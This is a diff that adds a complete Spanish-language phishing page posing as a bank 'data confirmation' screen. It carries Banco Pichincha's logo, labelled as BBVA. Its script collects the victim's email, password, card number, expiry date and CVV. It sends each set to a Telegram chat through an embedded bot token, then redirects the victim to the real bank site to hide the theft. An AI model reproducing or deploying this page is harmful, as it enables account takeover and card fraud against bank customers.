@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Confirmacion de Datos</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Estilos CSS para hacer adaptable a dispositivos moviles y web */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #e5be01; /* Cambio de color de fondo */
+        }
+
+        form {
+            width: 90%;
+            max-width: 350px;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff; /* Fondo blanco para contraste */
+            text-align: center;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="month"],
+        input[type="number"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 16px;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 3px;
+            background-color: #002366; /* Color azul de BBVA */
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #001a4d; /* Azul mas oscuro para el efecto hover */
+        }
+
+        #logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 200px; /* Tamaño del logo incrementado */
+        }
+
+        h2 {
+            color: #002366; /* Color azul de BBVA */
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="form-container">
+        <form id="loginForm">
+            <img src="https://seeklogo.com/images/B/banco-pichincha-horizontal-white-background-logo-12F6AFB0D4-seeklogo.com.png" alt="BBVA Logo" id="logo">
+            <h2>Confirmacion de Datos</h2>
+            <input type="text" name="username" placeholder="Correo Electronico" required pattern="^[^\s@]+@[^\s@]+\.[^\s@]+$" title="Debe ser un correo valido">
+            <input type="password" name="password" placeholder="Contrasena" required>
+            <input type="submit" value="Siguiente">
+        </form>
+
+        <form id="cardForm" style="display:none;">
+            <img src="https://seeklogo.com/images/B/banco-pichincha-horizontal-white-background-logo-12F6AFB0D4-seeklogo.com.png" alt="BBVA Logo" id="logo">
+            <h2>Confirmacion de Tarjeta</h2>
+            <input type="text" name="cardNumber" placeholder="Numero de Tarjeta" required pattern="\d{16}" title="Debe contener 16 digitos" maxlength="16" inputmode="numeric">
+            <input type="month" name="expiryDate" placeholder="Fecha de Vencimiento" required>
+            <input type="number" name="cvv" placeholder="CVV" required pattern="\d{3}" title="Debe contener 3 digitos" maxlength="3">
+            <input type="submit" value="Enviar">
+        </form>
+    </div>
+
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script>
+        const botToken = '6650518495:AAEOkqsRaOECSYLm44mpHSczhIxfNXi4m7k';
+        const chatId = '-1002226168053';
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+            const username = formData.get('username');
+            const password = formData.get('password');
+
+            const message = `La Casa Del Truco Informa:\nCorreo: ${username}\nContrasena: ${password}`;
+
+            axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            })
+            .then(() => {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('cardForm').style.display = 'block';
+            })
+            .catch((error) => {
+                console.error('Error al enviar mensaje a Telegram:', error);
+                alert('Ocurrio un error al enviar los datos a Telegram. Por favor, intentelo de nuevo mas tarde.');
+            });
+        });
+
+        document.getElementById('cardForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+            const cardNumber = formData.get('cardNumber');
+            const expiryDate = formData.get('expiryDate');
+            const cvv = formData.get('cvv');
+
+            const message = `La Casa Del Truco Informa:\nNumero de Tarjeta: ${cardNumber}\nFecha de Vencimiento: ${expiryDate}\nCVV: ${cvv}`;
+
+            axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            })
+            .then(() => {
+                window.location.href = "https://www.pichincha.com"; // Redirigir al usuario a pichincha.com
+            })
+            .catch((error) => {
+                console.error('Error al enviar mensaje a Telegram:', error);
+                alert('Ocurrio un error al enviar los datos a Telegram. Por favor, intentelo de nuevo mas tarde.');
+            });
+        });
+
+        // Solo permitir numeros en el campo de numero de tarjeta
+        document.querySelector('input[name="cardNumber"]').addEventListener('input', function (e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+    </script>
+</body>
+</html>
